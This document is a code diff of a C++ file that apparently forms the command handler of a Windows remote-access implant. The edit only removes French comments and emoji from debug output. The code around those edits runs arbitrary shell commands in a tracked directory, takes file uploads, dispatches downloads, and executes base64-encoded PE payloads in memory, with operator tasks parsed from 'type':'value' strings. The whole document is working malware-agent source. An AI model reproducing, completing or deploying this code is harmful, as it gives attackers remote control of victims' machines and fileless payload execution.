@@ -12,10 +12,8 @@
 #include <iostream>
 #include <sstream>
 
-// Variable globale pour stocker le répertoire courant
 static std::string g_current_directory;
 
-// Initialiser le répertoire courant au démarrage
 void init_current_directory() {
     if (g_current_directory.empty()) {
         char buffer[MAX_PATH];
@@ -39,16 +37,13 @@ std::string get_current_directory_path() {
 std::string exec_cmd(const std::string& cmd) {
     std::string result;
 
-    // Initialiser le répertoire si nécessaire
     if (g_current_directory.empty()) {
         init_current_directory();
     }
 
-    // Vérifier si c'est une commande CD
     std::string cmd_lower = cmd;
     for (auto& c : cmd_lower) c = tolower(c);
 
-    // Trim pour vérifier la commande
     size_t cmd_start = cmd_lower.find_first_not_of(" \t");
     if (cmd_start != std::string::npos) {
         cmd_lower = cmd_lower.substr(cmd_start);
@@ -57,7 +52,7 @@ std::string exec_cmd(const std::string& cmd) {
     if (cmd_lower.substr(0, 2) == "cd" &&
         (cmd_lower.length() == 2 || cmd_lower[2] == ' ' || cmd_lower[2] == '\t')) {
 
-        // Extraire le chemin après "cd "
+
         std::string path = cmd.substr(cmd.find_first_not_of(" \t"));
         if (path.length() > 2) {
             path = path.substr(2);
@@ -65,7 +60,6 @@ std::string exec_cmd(const std::string& cmd) {
             path = "";
         }
 
-        // Trim les espaces
         size_t start = path.find_first_not_of(" \t");
         if (start != std::string::npos) {
             path = path.substr(start);
@@ -77,7 +71,6 @@ std::string exec_cmd(const std::string& cmd) {
             path = path.substr(0, end + 1);
         }
 
-        // Si le chemin est vide, retourner au home
         if (path.empty()) {
             char home[MAX_PATH];
             if (GetEnvironmentVariableA("USERPROFILE", home, MAX_PATH)) {
@@ -86,7 +79,6 @@ std::string exec_cmd(const std::string& cmd) {
             return "Changed directory to: " + g_current_directory;
         }
 
-        // Si c'est un chemin relatif, le combiner avec le répertoire courant
         char resolved_path[MAX_PATH];
         if (PathIsRelativeA(path.c_str())) {
             std::string full_path = g_current_directory + "\\" + path;
@@ -98,18 +90,16 @@ std::string exec_cmd(const std::string& cmd) {
             path = resolved_path;
         }
 
-        // Vérifier si le répertoire existe
         DWORD attrs = GetFileAttributesA(path.c_str());
         if (attrs == INVALID_FILE_ATTRIBUTES || !(attrs & FILE_ATTRIBUTE_DIRECTORY)) {
             return "Error: Directory not found: " + path;
         }
 
-        // Changer le répertoire
+
         g_current_directory = path;
         return "Changed directory to: " + g_current_directory;
     }
 
-    // Pour les autres commandes, exécuter dans le répertoire courant
     std::string full_cmd = "cd /d \"" + g_current_directory + "\" && " + cmd;
 
     char buffer[512];
@@ -122,7 +112,6 @@ std::string exec_cmd(const std::string& cmd) {
 
     int exit_code = _pclose(pipe);
 
-    // Si la commande a échoué et qu'il n'y a pas de sortie, ajouter un message
     if (exit_code != 0 && result.empty()) {
         result = "Command failed with exit code: " + std::to_string(exit_code);
     }
@@ -164,7 +153,6 @@ std::string get_filecontent(std::string data) {
 
 std::string handle_upload(std::string data) {
     try {
-        // Décoder le JSON base64
         std::string file_props = base64_decode(data);
 
         #ifdef _DEBUG
@@ -186,7 +174,6 @@ std::string handle_upload(std::string data) {
         std::cout << "[UPLOAD] Content size (base64): " << b64_encoded_filecontent.length() << std::endl;
         #endif
 
-        // Construire le chemin complet avec le répertoire courant
         if (g_current_directory.empty()) {
             init_current_directory();
         }
@@ -209,10 +196,7 @@ std::string handle_pe_exec(std::string pe_data_json) {
         std::cout << "[PE-EXEC] First 100 chars: " << pe_data_json.substr(0, std::min<size_t>(100, pe_data_json.length())) << std::endl;
         #endif
 
-        // ✅ pe_data_json est déjà le JSON: {'content':'base64_pe','args':'base64_args'}
-        // PAS DE DÉCODAGE BASE64 ICI !
 
-        // Vérifier que c'est bien du JSON
         if (pe_data_json.find("'content':") == std::string::npos) {
             std::ostringstream err;
             err << "Error: Invalid PE data format (missing 'content' key)\n";
@@ -227,15 +211,13 @@ std::string handle_pe_exec(std::string pe_data_json) {
         }
 
         #ifdef _DEBUG
-        std::cout << "[PE-EXEC] ✅ JSON format detected" << std::endl;
+        std::cout << "[PE-EXEC] JSON format detected" << std::endl;
         #endif
 
-        // ✅ Passer directement le JSON à exec_pe_in_mem
-        // exec_pe_in_mem va extraire le base64, puis le décoder
         std::string output = exec_pe_in_mem(pe_data_json);
 
         #ifdef _DEBUG
-        std::cout << "[PE-EXEC] ✅ exec_pe_in_mem completed" << std::endl;
+        std::cout << "[PE-EXEC] exec_pe_in_mem completed" << std::endl;
         std::cout << "[PE-EXEC] Output length: " << output.length() << " bytes" << std::endl;
         #endif
 
@@ -252,12 +234,9 @@ std::string handle_pe_exec(std::string pe_data_json) {
         return err.str();
     }
 }
-// Parse le format 'type':'value'
 void parse_type_and_value(const std::string& task, std::string& types, std::string& value) {
-    // Chercher le pattern 'type':'value'
     size_t sep1 = task.find('\'');
     if (sep1 == std::string::npos) {
-        // Pas de format détecté, considérer comme commande simple
         types = "";
         value = "";
         return;
@@ -272,7 +251,6 @@ void parse_type_and_value(const std::string& task, std::string& types, std::stri
 
     types = task.substr(sep1 + 1, sep2 - sep1 - 1);
 
-    // Chercher le séparateur ':'
     size_t colon = task.find(':', sep2);
     if (colon == std::string::npos) {
         types = "";
@@ -289,9 +267,7 @@ void parse_type_and_value(const std::string& task, std::string& types, std::stri
 
     size_t sep4 = task.find('\'', sep3 + 1);
     if (sep4 == std::string::npos) {
-        // Peut-être que la value va jusqu'à la fin
         value = task.substr(sep3 + 1);
-        // Enlever les caractères de fin potentiels
         size_t end = value.find_last_not_of(" \t\r\n'");
         if (end != std::string::npos) {
             value = value.substr(0, end + 1);
@@ -309,7 +285,6 @@ std::string execute_command(const std::string& command) {
     std::string types, data;
     parse_type_and_value(command, types, data);
 
-    // Si pas de type détecté, considérer comme commande cmd
     if (types.empty()) {
         types = "cmd";
         data = command;
@@ -325,7 +300,6 @@ std::string execute_command(const std::string& command) {
             return result;
         }
         else if (types == "download") {
-            // handle_download est définie dans file_utils.cpp
             std::string result = handle_download(data);
             return result;
         }
